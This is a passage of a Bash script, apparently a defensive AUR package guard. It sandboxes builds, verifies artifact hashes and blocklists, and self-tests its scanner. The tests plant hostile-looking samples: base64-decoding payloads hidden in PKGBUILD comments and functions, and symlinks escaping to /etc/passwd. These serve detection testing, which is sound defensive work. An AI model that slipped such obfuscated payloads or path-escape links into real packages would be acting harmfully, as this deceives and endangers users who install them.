        "$pkgdir" top || return 1
    fi

    mapfile -t artifacts < <(
      find "$pkgdir/.awtarchy-pkg" -maxdepth 1 -type f \
        -name '*.pkg.tar.*' ! -name '*.sig' -print | LC_ALL=C sort
    )
    if (( ${#artifacts[@]} == 0 )); then
      _aur_guard_fail "$pkgbase completed without producing a package artifact"
      return 1
    fi

    for artifact in "${artifacts[@]}"; do
      pkgname=$(_aur_guard_artifact_name "$artifact")
      [[ -n "$pkgname" ]] || {
        _aur_guard_fail "could not read package name from artifact: $artifact"
        return 1
      }
      _aur_guard_validate_package_name "$pkgname" || return 1

      scan_root="$pkgdir/.awtarchy-artifact-scan/${pkgname//[^a-zA-Z0-9._+-]/_}"
      _aur_guard_scan_artifact "$pkgbase" "$artifact" "$scan_root" || return 1

      required=false
      while IFS=$'\t' read -r required_base required_name; do
        if [[ "$required_base" == "$pkgbase" && "$required_name" == "$pkgname" ]]; then
          required=true
          break
        fi
      done < "$_AUR_GUARD_REQUIRED_PACKAGES"

      $required || continue

      if awk -F '\t' -v n="$pkgname" '$2 == n {found=1} END {exit !found}' \
          "$_AUR_GUARD_ARTIFACTS"; then
        _aur_guard_fail "multiple verified artifacts claim the same package name: $pkgname"
        return 1
      fi

      hash=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
      printf '%s\t%s\t%s\t%s\n' "$pkgbase" "$pkgname" "$artifact" "$hash" \
        >> "$_AUR_GUARD_ARTIFACTS"
    done

    while IFS=$'\t' read -r required_base required_name; do
      [[ "$required_base" == "$pkgbase" ]] || continue
      if ! awk -F '\t' -v b="$pkgbase" -v n="$required_name" \
          '$1 == b && $2 == n {found=1} END {exit !found}' \
          "$_AUR_GUARD_ARTIFACTS"; then
        _aur_guard_fail "$pkgbase did not produce required split package $required_name"
        return 1
      fi
    done < "$_AUR_GUARD_REQUIRED_PACKAGES"
  done < "$_AUR_GUARD_MANIFEST"

  if ! awk -F '\t' -v n="$requested_pkg" \
      '$2 == n {found=1} END {exit !found}' "$_AUR_GUARD_ARTIFACTS"; then
    _aur_guard_fail "no verified artifact was produced for requested package $requested_pkg"
    return 1
  fi
}

_aur_guard_verify_artifact_hashes() {
  local pkgbase pkgname artifact expected actual

  while IFS=$'\t' read -r pkgbase pkgname artifact expected; do
    [[ -f "$artifact" ]] || {
      _aur_guard_fail "verified artifact disappeared before installation: $artifact"
      return 1
    }
    actual=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
    if [[ "$actual" != "$expected" ]]; then
      _aur_guard_fail "verified artifact changed before installation: $artifact"
      return 1
    fi
  done < "$_AUR_GUARD_ARTIFACTS"
}

_aur_guard_install_verified_transaction() {
  local requested_pkg="$1"
  local pkgbase pkgname artifact hash reason
  local -a artifacts=()
  local -a mark_asdeps=()

  _aur_guard_verify_artifact_hashes || return 1

  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
    [[ -n "$artifact" ]] || continue
    artifacts+=("$artifact")

    if [[ "$pkgname" != "$requested_pkg" ]]; then
      reason=$(command pacman -Qi "$pkgname" 2>/dev/null \
        | awk -F ': ' '/^Install Reason/ {print $2; exit}')
      if [[ "$reason" != 'Explicitly installed' ]]; then
        mark_asdeps+=("$pkgname")
      fi
    fi
  done < "$_AUR_GUARD_ARTIFACTS"

  (( ${#artifacts[@]} > 0 )) || return 1
  _aur_guard_verify_artifact_hashes || return 1
  _AUR_GUARD_INSTALL_STARTED=1

  printf '\nAUR Guard: installing every verified AUR artifact and required repository dependency in one pacman transaction.\n'
  if ! sudo pacman -U --needed --noconfirm "${artifacts[@]}"; then
    return 1
  fi

  if (( ${#mark_asdeps[@]} > 0 )); then
    sudo pacman -D --asdeps "${mark_asdeps[@]}" || return 1
  fi
  sudo pacman -D --asexplicit "$requested_pkg" || return 1
}

_aur_guard_verify_tree() {
  local pkg="$1"

  type -P makepkg >/dev/null 2>&1 || {
    _aur_guard_fail 'makepkg is required'
    return 127
  }

  type -P git >/dev/null 2>&1 || {
    _aur_guard_fail 'git is required'
    return 127
  }

  type -P bwrap >/dev/null 2>&1 || {
    _aur_guard_fail 'bubblewrap is required. Install it with: sudo pacman -S bubblewrap'
    return 127
  }

  type -P systemd-run >/dev/null 2>&1 || {
    _aur_guard_fail 'systemd-run is required for cgroup resource and network filtering'
    return 127
  }

  if [[ ${_AUR_GUARD_BUILD_REQUESTED:-0} == 1 ]]; then
    type -P mkarchroot >/dev/null 2>&1 || {
      _aur_guard_fail 'mkarchroot from devtools is required for clean-root builds. Install it with: sudo pacman -S devtools'
      return 127
    }

    type -P arch-nspawn >/dev/null 2>&1 || {
      _aur_guard_fail 'arch-nspawn from devtools is required for clean-root builds. Install it with: sudo pacman -S devtools'
      return 127
    }
  fi

  type -P timeout >/dev/null 2>&1 || {
    _aur_guard_fail 'timeout from coreutils is required'
    return 127
  }

  type -P gpg >/dev/null 2>&1 || {
    _aur_guard_fail 'gpg is required for isolated PGP source verification'
    return 127
  }

  type -P jq >/dev/null 2>&1 || {
    _aur_guard_fail 'jq is required for safe AUR virtual dependency resolution'
    return 127
  }

  if [[ ${_AUR_GUARD_BUILD_REQUESTED:-0} == 1 ]]; then
    type -P bsdtar >/dev/null 2>&1 || {
      _aur_guard_fail 'bsdtar from libarchive is required for built-package inspection'
      return 127
    }
  fi

  [[ -x /usr/bin/file ]] || {
    _aur_guard_fail 'file is required for binary-safe source inspection'
    return 127
  }

  [[ -x /usr/bin/b2sum ]] || {
    _aur_guard_fail 'b2sum from coreutils is required for content-addressed PyPI verification'
    return 127
  }

  if ! type -P curl >/dev/null 2>&1 && ! type -P wget >/dev/null 2>&1; then
    _aur_guard_fail 'curl or wget is required to check historical AUR incident lists'
    return 127
  fi

  if [[ ${AUR_GUARD_TEST_MODE:-0} != 1 ]]; then
    local sandbox_uid sandbox_gid
    sandbox_uid=$(id -u) || return 1
    sandbox_gid=$(id -g) || return 1

    if ! sudo -v; then
      _aur_guard_fail 'sudo authentication is required to create system-managed AUR sandbox services'
      return 1
    fi

    if ! sudo -- systemd-run --system --wait --pipe --collect --quiet \
        --uid="$sandbox_uid" \
        --gid="$sandbox_gid" \
        --property=Type=exec \
        --property=IPAddressDeny=any \
        /usr/bin/true >/dev/null 2>&1; then
      _aur_guard_fail 'the system service manager cannot enforce cgroup IP filtering for transient sandbox services'
      return 1
    fi

    if type -P curl >/dev/null 2>&1; then
      if sudo -- systemd-run --system --wait --pipe --collect --quiet \
          --uid="$sandbox_uid" \
          --gid="$sandbox_gid" \
          --property=Type=exec \
          --property=IPAddressDeny=any \
          /usr/bin/curl --fail --silent --show-error --max-time 5 \
          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
        return 1
      fi
    else
      if sudo -- systemd-run --system --wait --pipe --collect --quiet \
          --uid="$sandbox_uid" \
          --gid="$sandbox_gid" \
          --property=Type=exec \
          --property=IPAddressDeny=any \
          /usr/bin/wget --quiet --timeout=5 --output-document=/dev/null \
          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
        return 1
      fi
    fi
  fi

  _aur_guard_refresh_blacklists || return 1

  _AUR_GUARD_WORK_DIR=$(_aur_guard_create_work_dir) || return 1
  _AUR_GUARD_MANIFEST="$_AUR_GUARD_WORK_DIR/verified-packages.tsv"
  _AUR_GUARD_REQUIRED_PACKAGES="$_AUR_GUARD_WORK_DIR/required-packages.tsv"
  _AUR_GUARD_REPO_DEPS="$_AUR_GUARD_WORK_DIR/repository-dependencies.txt"
  _AUR_GUARD_ARTIFACTS="$_AUR_GUARD_WORK_DIR/built-artifacts.tsv"
  _AUR_GUARD_AUR_METADATA="$_AUR_GUARD_WORK_DIR/aur-metadata.tsv"
  _AUR_GUARD_IDENTITY_CHANGES="$_AUR_GUARD_WORK_DIR/maintainer-changes.tsv"
  _AUR_GUARD_VCS_SNAPSHOTS="$_AUR_GUARD_WORK_DIR/vcs-snapshots.tsv"
  : > "$_AUR_GUARD_MANIFEST"
  : > "$_AUR_GUARD_REQUIRED_PACKAGES"
  : > "$_AUR_GUARD_REPO_DEPS"
  : > "$_AUR_GUARD_ARTIFACTS"
  : > "$_AUR_GUARD_AUR_METADATA"
  : > "$_AUR_GUARD_IDENTITY_CHANGES"
  : > "$_AUR_GUARD_VCS_SNAPSHOTS"

  declare -gA _AUR_GUARD_REQUEST_STATE=()
  declare -gA _AUR_GUARD_BASE_STATE=()
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_INSTALL_STARTED=0
  _AUR_GUARD_IDENTITY_ASSESSED=0

  printf 'AUR Verify: recursively checking %s and all required AUR dependencies in %s mode.\n' \
    "$pkg" "${_AUR_GUARD_MODE:-practical}"
  _aur_guard_verify_package_recursive "$pkg" '(requested)' || return 1

  printf '\nVerified AUR package bases:\n'
  awk -F '\t' '{printf "  %-36s %s\n", $1, substr($2, 1, 12)}' \
    "$_AUR_GUARD_MANIFEST"

  if _aur_guard_has_context_warnings; then
    _aur_guard_print_context_summary
  fi
}

_aur_guard_create_work_dir() {
  local parent="$_AUR_GUARD_WORK_PARENT"

  case "$parent" in
    /*)
      ;;
    *)
      _aur_guard_fail "AUR Guard work parent must be an absolute path: $parent"
      return 1
      ;;
  esac

  if [[ -L "$parent" ]]; then
    _aur_guard_fail "AUR Guard work parent must not be a symbolic link: $parent"
    return 1
  fi

  mkdir -p -- "$parent" || {
    _aur_guard_fail "could not create AUR Guard work parent: $parent"
    return 1
  }
  chmod 0700 -- "$parent" || {
    _aur_guard_fail "could not secure AUR Guard work parent: $parent"
    return 1
  }

  [[ -d "$parent" && ! -L "$parent" ]] || {
    _aur_guard_fail "AUR Guard work parent is not a secure directory: $parent"
    return 1
  }

  mktemp -d "$parent/session.XXXXXX"
}

_aur_guard_cleanup_work() {
  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR/build-roots ]]; then
    sudo rm -rf -- "$_AUR_GUARD_WORK_DIR/build-roots" 2>/dev/null || true
  fi
  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR ]]; then
    rm -rf "$_AUR_GUARD_WORK_DIR"
  fi
  unset _AUR_GUARD_WORK_DIR _AUR_GUARD_MANIFEST _AUR_GUARD_HELPER
  unset _AUR_GUARD_SANDBOX_ROOTFS _AUR_GUARD_INSTALL_STARTED
  unset _AUR_GUARD_REQUIRED_PACKAGES _AUR_GUARD_REPO_DEPS _AUR_GUARD_ARTIFACTS
  unset _AUR_GUARD_AUR_METADATA _AUR_GUARD_IDENTITY_CHANGES
  unset _AUR_GUARD_VCS_SNAPSHOTS
  unset _AUR_GUARD_IDENTITY_ASSESSED
  unset _AUR_GUARD_REQUEST_STATE _AUR_GUARD_BASE_STATE
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
}

aurguardtest() (
  local test_root test_bin helper_log network_log historical_output
  local aurup_output wrapper_output aurup_status
  local tool

  test_root=$(mktemp -d) || return 1
  trap 'rm -rf "$test_root"' EXIT

  test_bin="$test_root/bin"
  helper_log="$test_root/helper-called.log"
  network_log="$test_root/network-called.log"
  historical_output="$test_root/historical-output.log"
  mkdir -p "$test_bin" "$test_root/cache"

  for tool in makepkg git jq bwrap gpg timeout bsdtar systemd-run mkarchroot arch-nspawn sha256sum realpath; do
    printf '%s\n' '#!/bin/sh' 'exit 0' > "$test_bin/$tool"
  done

  cat > "$test_bin/curl" <<'AUR_GUARD_TEST_CURL'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_NETWORK_LOG:?}"
exit 99
AUR_GUARD_TEST_CURL

  printf '%s\n' '#!/bin/sh' 'exit 1' > "$test_bin/pacman"

  cat > "$test_bin/yay" <<'AUR_GUARD_TEST_HELPER'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_HELPER_LOG:?}"
exit 0
AUR_GUARD_TEST_HELPER

  cp "$test_bin/yay" "$test_bin/paru"
  chmod 0755 "$test_bin"/*

  export AUR_GUARD_TEST_HELPER_LOG="$helper_log"
  export AUR_GUARD_TEST_NETWORK_LOG="$network_log"
  export AUR_GUARD_TEST_MODE=1
  PATH="$test_bin:$PATH"
  export PATH

  _AUR_GUARD_CACHE_DIR="$test_root/cache"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  # Keep this test offline and deterministic. The files above simulate both
  # historical incident-list sources after a successful refresh.
  _aur_guard_refresh_blacklists() {
    return 0
  }

  printf '\nAUR Guard self-test: public-network sandboxes avoid pasta namespace attachment.\n'
  local network_sandbox_definition
  network_sandbox_definition=$(declare -f _aur_guard_run_sandbox_command) || return 1
  if grep -Fq '/usr/bin/pasta' <<< "$network_sandbox_definition" \
      || grep -Fq 'pasta namespace attachment is unavailable' <<< "$network_sandbox_definition"; then
    _aur_guard_fail 'self-test failed: public-network sandbox still contains pasta namespace attachment logic'
    return 1
  fi
  if ! grep -Fq 'IPAddressDeny=0.0.0.0/8' <<< "$network_sandbox_definition" \
      || ! grep -Fq -- '--unshare-net' <<< "$network_sandbox_definition" \
      || ! grep -Fq -- '--block-fd' <<< "$network_sandbox_definition" \
      || ! grep -Fq -- '--json-status-fd' <<< "$network_sandbox_definition"; then
    _aur_guard_fail 'self-test failed: public-network sandbox does not retain systemd filtering and bwrap network-argument removal'
    return 1
  fi

  printf 'AUR Guard self-test: emergency-blocked packages must be refused.\n'
  if aurup_output=$(aurinstall vesktop-bin-patched 2>&1); then
    aurup_status=0
  else
    aurup_status=$?
  fi
  printf '%s\n' "$aurup_output"

  if (( aurup_status == 0 )); then
    _aur_guard_fail 'self-test failed: aurinstall returned success for an emergency-blocked package'
    return 1
  fi

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: the external AUR helper was invoked'
    return 1
  fi

  if ! command grep -Fq \
      'Awtarchy refused to install: vesktop-bin-patched' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: expected refusal message was not produced'
    return 1
  fi

  if ! command grep -Fq \
      'emergency blocklist' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: refusal did not identify the emergency blocklist match'
    return 1
  fi

  printf '\nAUR Guard self-test: historical incident names must warn instead of hard-blocking.\n'
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  if ! _aur_guard_note_historical_match \
      'historical-only-test' > "$historical_output" 2>&1; then
    cat "$historical_output"
    _aur_guard_fail 'self-test failed: historical incident warning returned failure'
    return 1
  fi
  cat "$historical_output"

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[historical-only-test]+set} ]]; then
    _aur_guard_fail 'self-test failed: historical incident match was not recorded'
    return 1
  fi

  if ! _aur_guard_check_emergency_block 'historical-only-test'; then
    _aur_guard_fail 'self-test failed: a historical-only package was incorrectly hard-blocked'
    return 1
  fi

  if _aur_guard_confirm_guarded_install \
      'historical-only-test' <<< 'n'; then
    _aur_guard_fail 'self-test failed: declined historical confirmation was accepted'
    return 1
  fi

  if ! _aur_guard_confirm_guarded_install \
      'historical-only-test' <<< 'y'; then
    _aur_guard_fail 'self-test failed: affirmative historical confirmation was rejected'
    return 1
  fi

  printf '\nAUR Guard self-test: suspicious JavaScript package-manager dependencies require source evidence.\n'
  mkdir -p "$test_root/js-mismatch/source" "$test_root/js-valid/source"
  printf '%s\n' 'makedepends = bun' > "$test_root/js-mismatch/.SRCINFO"
  printf '%s\n' 'bun build' > "$test_root/js-mismatch/PKGBUILD"

  if _aur_guard_validate_dependency_evidence \
      'js-mismatch' \
      "$test_root/js-mismatch/.SRCINFO" \
      "$test_root/js-mismatch" \
      "$test_root/js-mismatch/source"; then
    _aur_guard_fail 'self-test failed: Bun dependency without package.json passed validation'
    return 1
  fi

  printf '%s\n' 'makedepends = bun' > "$test_root/js-valid/.SRCINFO"
  printf '%s\n' 'bun build' > "$test_root/js-valid/PKGBUILD"
  printf '%s\n' '{"name":"test"}' > "$test_root/js-valid/source/package.json"
  : > "$test_root/js-valid/source/bun.lock"

  if ! _aur_guard_validate_dependency_evidence \
      'js-valid' \
      "$test_root/js-valid/.SRCINFO" \
      "$test_root/js-valid" \
      "$test_root/js-valid/source"; then
    _aur_guard_fail 'self-test failed: Bun dependency with matching manifests was rejected'
    return 1
  fi

  printf '\nAUR Guard self-test: raw yay -S must also be blocked.\n'
  if wrapper_output=$(yay -S vesktop-bin-patched 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: wrapped yay returned success'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: raw yay reached the external helper'
    return 1
  fi

  printf '\nAUR Guard self-test: read-only yay/paru queries must remain available.\n'
  : > "$helper_log"

  local direct_command
  for direct_command in \
      'yay -Qm' \
      'yay -Qiu' \
      'yay -Ss example' \
      'yay --version' \
      'paru -Qm' \
      'paru --version'; do
    if ! wrapper_output=$(eval "$direct_command" 2>&1); then
      printf '%s\n' "$wrapper_output"
      _aur_guard_fail "self-test failed: read-only helper query was blocked: $direct_command"
      return 1
    fi
  done

  if (( $(wc -l < "$helper_log") != 6 )); then
    _aur_guard_fail 'self-test failed: one or more read-only helper queries did not reach the external helper'
    return 1
  fi

  printf '\nAUR Guard self-test: helper writes and package transactions must remain blocked.\n'
  : > "$helper_log"
  for direct_command in \
      'yay -G example' \
      'yay -S example' \
      'yay -Syu' \
      'paru -R example'; do
    if wrapper_output=$(eval "$direct_command" 2>&1); then
      printf '%s\n' "$wrapper_output"
      _aur_guard_fail "self-test failed: blocked helper transaction returned success: $direct_command"
      return 1
    fi
  done

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: a blocked yay/paru command reached the external helper'
    return 1
  fi

  if _aur_guard_validate_package_name '--config'; then
    _aur_guard_fail 'self-test failed: option-shaped package name passed validation'
    return 1
  fi

  printf '\nAUR Guard self-test: remote sources require strong immutable integrity.\n'
  cat > "$test_root/weak-integrity.SRCINFO" <<'AUR_GUARD_TEST_WEAK_INTEGRITY'
pkgbase = weak-integrity
	pkgname = weak-integrity
	source = https://example.invalid/source.tar.gz
	md5sums = d41d8cd98f00b204e9800998ecf8427e
AUR_GUARD_TEST_WEAK_INTEGRITY
  if _aur_guard_validate_skipped_integrity \
      'weak-integrity' "$test_root/weak-integrity.SRCINFO"; then
    _aur_guard_fail 'self-test failed: weak remote-source integrity was accepted'
    return 1
  fi

  cat > "$test_root/pgp-integrity.SRCINFO" <<'AUR_GUARD_TEST_PGP_INTEGRITY'
pkgbase = pgp-integrity
	pkgname = pgp-integrity
	source = source.tar.gz::https://example.invalid/source.tar.gz
	source = source.tar.gz.sig::https://example.invalid/source.tar.gz.sig
	sha256sums = SKIP
	sha256sums = SKIP
	validpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567
AUR_GUARD_TEST_PGP_INTEGRITY
  _aur_guard_validate_skipped_integrity \
    'pgp-integrity' "$test_root/pgp-integrity.SRCINFO" || {
    _aur_guard_fail 'self-test failed: matching pinned PGP source verification was rejected'
    return 1
  }

  cat > "$test_root/pgp-sidecar.SRCINFO" <<'AUR_GUARD_TEST_PGP_SIDECAR'
pkgbase = pgp-sidecar
	pkgname = pgp-sidecar
	source = source.tar.xz::https://example.invalid/source.tar.xz
	source = source.tar.sign::https://example.invalid/source.tar.sign
	sha256sums = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
	sha256sums = SKIP
	validpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567
AUR_GUARD_TEST_PGP_SIDECAR
  _aur_guard_validate_skipped_integrity \
    'pgp-sidecar' "$test_root/pgp-sidecar.SRCINFO" || {
    _aur_guard_fail 'self-test failed: checksum-protected payload with a detached signature sidecar was rejected'
    return 1
  }

  sed -i \
    's/sha256sums = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef/sha256sums = SKIP/' \
    "$test_root/pgp-sidecar.SRCINFO"
  if _aur_guard_validate_skipped_integrity \
      'pgp-sidecar-unverified' "$test_root/pgp-sidecar.SRCINFO"; then
    _aur_guard_fail 'self-test failed: detached signature sidecar authenticated an unmatched unverified payload'
    return 1
  fi

  printf '\nAUR Guard self-test: content-addressed PyPI sources require matching BLAKE2b-256 content.\n'
  local pypi_digest
  mkdir -p "$test_root/pypi-content"
  printf '%s\n' 'verified PyPI content' > "$test_root/pypi-content/source.tar.gz"
  pypi_digest=$(/usr/bin/b2sum -l 256 -- "$test_root/pypi-content/source.tar.gz") || return 1
  pypi_digest=${pypi_digest%% *}
  cat > "$test_root/pypi-content.SRCINFO" <<AUR_GUARD_TEST_PYPI_INTEGRITY
pkgbase = pypi-content
	pkgname = pypi-content
	source = https://files.pythonhosted.org/packages/${pypi_digest:0:2}/${pypi_digest:2:2}/${pypi_digest:4}/source.tar.gz
	md5sums = d41d8cd98f00b204e9800998ecf8427e
AUR_GUARD_TEST_PYPI_INTEGRITY

  _aur_guard_validate_skipped_integrity \
    'pypi-content' "$test_root/pypi-content.SRCINFO" || {
    _aur_guard_fail 'self-test failed: a valid content-addressed PyPI source was rejected before download verification'
    return 1
  }
  _aur_guard_verify_content_addressed_sources \
    'pypi-content' "$test_root/pypi-content.SRCINFO" "$test_root/pypi-content" || {
    _aur_guard_fail 'self-test failed: a matching content-addressed PyPI source digest was rejected'
    return 1
  }

  printf '%s\n' 'tampered PyPI content' > "$test_root/pypi-content/source.tar.gz"
  if _aur_guard_verify_content_addressed_sources \
      'pypi-content' "$test_root/pypi-content.SRCINFO" "$test_root/pypi-content"; then
    _aur_guard_fail 'self-test failed: a mismatched content-addressed PyPI source digest was accepted'
    return 1
  fi

  printf '\nAUR Guard self-test: checkout-internal relative symlinks are allowed but escaping links are blocked.\n'
  mkdir -p "$test_root/checkout/LICENSES"
  printf '%s\n' 'pkgname=checkout-self-test' > "$test_root/checkout/PKGBUILD"
  printf '%s\n' 'pkgbase = checkout-self-test' > "$test_root/checkout/.SRCINFO"
  printf '%s\n' 'license text' > "$test_root/checkout/LICENSE"
  ln -s ../LICENSE "$test_root/checkout/LICENSES/0BSD.txt"

  _aur_guard_validate_checkout_tree \
    'checkout-self-test' "$test_root/checkout" || {
    _aur_guard_fail 'self-test failed: an internal relative checkout symlink was rejected'
    return 1
  }

  ln -s /etc/passwd "$test_root/checkout/escape"
  if _aur_guard_validate_checkout_tree \
      'checkout-self-test' "$test_root/checkout"; then
    _aur_guard_fail 'self-test failed: an absolute checkout symlink was accepted'
    return 1
  fi
  rm -f "$test_root/checkout/escape"

  printf '\nAUR Guard self-test: inert Maintainer and Contributor comments do not hide executable PKGBUILD payloads.\n'
  mkdir -p "$test_root/identity-comments"
  cat > "$test_root/identity-comments/PKGBUILD" <<'AUR_GUARD_TEST_IDENTITY_COMMENTS'
# Maintainer: Example <echo ZXhhbXBsZUBleGFtcGxlLmludmFsaWQK | base64 -d>
# Contributor: Example <`echo ZXhhbXBsZUBleGFtcGxlLmludmFsaWQK | base64 -d`>
pkgname=identity-comment-self-test
pkgver=1
pkgrel=1
package() {
  install -Dm644 /dev/null "$pkgdir/usr/share/identity-comment-self-test/marker"
}
AUR_GUARD_TEST_IDENTITY_COMMENTS

  if ! wrapper_output=$(_aur_guard_scan_package_files \
      'identity-comment-self-test' "$test_root/identity-comments" 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: an inert Maintainer or Contributor comment was hard-blocked'
    return 1
  fi

  cat >> "$test_root/identity-comments/PKGBUILD" <<'AUR_GUARD_TEST_EXECUTABLE_PAYLOAD'
malicious_payload() {
  printf '%s' ZWNobyB1bnNhZmU= | base64 -d
}
AUR_GUARD_TEST_EXECUTABLE_PAYLOAD

  if wrapper_output=$(_aur_guard_scan_package_files \
      'identity-comment-self-test' "$test_root/identity-comments" 2>&1); then
    _aur_guard_fail 'self-test failed: executable PKGBUILD base64 decoding was hidden by the identity-comment exception'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  printf '\nAUR Guard self-test: artifact analysis is single-pass, path-constrained, and duplicate-aware.\n'
  local icon_listing="$test_root/icon-theme.list"
  local icon_report="$test_root/icon-theme.report"
  local normalized_link
  printf '%s\n' \
    '.PKGINFO' \
    '.BUILDINFO' \
    '.MTREE' \
    'usr/' \
    'usr/share/' \
    'usr/share/icons/' \
    'usr/share/icons/Example/index.theme' \
    'usr/share/icons/Example/apps/example.svg' \
    'usr/share/licenses/example-icon-theme/LICENSE' \
    > "$icon_listing"

  _aur_guard_analyze_artifact_listing \
    'example-icon-theme' "$icon_listing" "$icon_report" || {
    _aur_guard_fail 'self-test failed: valid icon-theme listing analysis failed'
    return 1
  }

  if [[ $(_aur_guard_artifact_report_value "$icon_report" file_count) != 9 \
      || $(_aur_guard_artifact_report_value "$icon_report" icon_theme_only) != 1 \
      || $(_aur_guard_artifact_report_value "$icon_report" unsafe_path) != 0 \
      || $(_aur_guard_artifact_report_value "$icon_report" duplicate_path) != 0 \
      || $(_aur_guard_artifact_report_value "$icon_report" has_pkginfo) != 1 \
      || $(_aur_guard_artifact_report_value "$icon_report" has_buildinfo) != 1 \
      || $(_aur_guard_artifact_report_value "$icon_report" has_mtree) != 1 ]]; then
    _aur_guard_fail 'self-test failed: valid icon-theme archive analysis returned incorrect policy results'
    return 1
  fi

  _aur_guard_analyze_artifact_listing \
    'example-package' "$icon_listing" "$icon_report" || return 1
  if [[ $(_aur_guard_artifact_report_value "$icon_report" icon_theme_only) != 0 ]]; then
    _aur_guard_fail 'self-test failed: a non-icon-theme package received icon-theme path classification'
    return 1
  fi

  printf '%s\n' 'usr/bin/payload' >> "$icon_listing"
  _aur_guard_analyze_artifact_listing \
    'example-icon-theme' "$icon_listing" "$icon_report" || return 1
  if [[ $(_aur_guard_artifact_report_value "$icon_report" icon_theme_only) != 0 ]]; then
    _aur_guard_fail 'self-test failed: executable paths retained icon-theme-only classification'
    return 1
  fi

  printf '%s\n' 'usr/bin/payload' '../escape' >> "$icon_listing"
  _aur_guard_analyze_artifact_listing \
    'example-icon-theme' "$icon_listing" "$icon_report" || return 1
  if [[ $(_aur_guard_artifact_report_value "$icon_report" duplicate_path) != 1 \
      || $(_aur_guard_artifact_report_value "$icon_report" unsafe_path) != 1 ]]; then
    _aur_guard_fail 'self-test failed: duplicate or unsafe archive paths were not detected'
    return 1
  fi

  printf '\nAUR Guard self-test: symbolic-link targets are normalized in-process without per-link subprocesses.\n'
  normalized_link=''
  _aur_guard_normalize_link_target \
    'usr/share/icons/Example/scalable/app.svg' '../shared.svg' normalized_link || {
    _aur_guard_fail 'self-test failed: safe relative symbolic-link target was rejected'
    return 1
  }
  [[ "$normalized_link" == 'usr/share/icons/Example/shared.svg' ]] || {
    _aur_guard_fail 'self-test failed: relative symbolic-link target normalized incorrectly'
    return 1
  }

  normalized_link=''
  _aur_guard_normalize_link_target \
    'usr/share/icons/Example/app.svg' '/usr/share/icons/Example/shared.svg' normalized_link || {
    _aur_guard_fail 'self-test failed: package-root absolute symbolic-link target was rejected'
    return 1
  }
  [[ "$normalized_link" == 'usr/share/icons/Example/shared.svg' ]] || {
    _aur_guard_fail 'self-test failed: absolute symbolic-link target normalized incorrectly'
    return 1
  }

  if _aur_guard_normalize_link_target \
      'usr/share/icons/app.svg' '../../../../etc/passwd' normalized_link; then
    _aur_guard_fail 'self-test failed: escaping symbolic-link target was accepted'
    return 1
  fi

  printf '\nAUR Guard self-test: build work uses a private disk-backed parent instead of implicit /tmp storage.\n'
  local saved_work_parent="$_AUR_GUARD_WORK_PARENT"
  local created_work_dir
  _AUR_GUARD_WORK_PARENT="$test_root/work-parent"
  created_work_dir=$(_aur_guard_create_work_dir) || {
    _AUR_GUARD_WORK_PARENT="$saved_work_parent"
    _aur_guard_fail 'self-test failed: private AUR Guard work directory creation failed'
    return 1
  }
  _AUR_GUARD_WORK_PARENT="$saved_work_parent"

  case "$created_work_dir" in
    "$test_root/work-parent"/session.*)
      ;;
    *)
      _aur_guard_fail 'self-test failed: AUR Guard work directory escaped its configured parent'
      return 1
      ;;
  esac
  if [[ $(stat -c '%a' "$test_root/work-parent") != 700 ]]; then
    _aur_guard_fail 'self-test failed: AUR Guard work parent was not private'
    return 1
  fi

  printf '\nAUR Guard self-test: opaque executable binaries warn instead of entering text-size checks.\n'
  mkdir -p "$test_root/binary-source"
  truncate -s $((9 * 1024 * 1024)) "$test_root/binary-source/prebuilt-tool"
  chmod 0755 "$test_root/binary-source/prebuilt-tool"
  if ! wrapper_output=$(_aur_guard_scan_source_tree \
      'binary-self-test-package' "$test_root/binary-source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: an opaque executable binary was rejected as an oversized text script'
    return 1
  fi
  printf '%s\n' "$wrapper_output"
  if ! /usr/bin/grep -Fq 'opaque binary or non-text file' <<< "$wrapper_output"; then
    _aur_guard_fail 'self-test failed: opaque executable binary did not produce a context warning'
    return 1
  fi

  printf '\nAUR Guard self-test: unreferenced development metadata warns while normal source payloads remain blocked.\n'
  mkdir -p "$test_root/development-source/.devcontainer"
  printf '%s\n' 'pkgname=development-self-test' > "$test_root/development-source/PKGBUILD"
